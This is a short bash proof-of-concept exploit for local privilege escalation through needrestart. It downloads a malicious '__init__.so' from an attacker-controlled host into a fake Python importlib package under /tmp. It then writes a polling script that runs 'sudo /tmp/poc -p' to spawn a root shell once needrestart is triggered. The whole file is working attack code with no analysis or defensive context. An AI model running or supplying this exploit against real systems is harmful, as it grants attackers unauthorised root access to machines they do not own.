#!/bin/bash
set -e
cd /tmp

mkdir -p rce/importlib

curl http://<attacker ip>:8000/__init__.so -o /tmp/rce/importlib/__init__.so

cat <<<'
import time
import os

while True:
	try:
		import importlib
	except:
		pass
		
	if os.path.exists("/tmp/poc"):
		print("Shell received")
		os.system("sudo /tmp/poc -p")
		break
	time.sleep(1)' > /tmp/rce/e.py

echo "Process is running. Trigger 'sudo /usr/sbin/needrestart' in another shell."
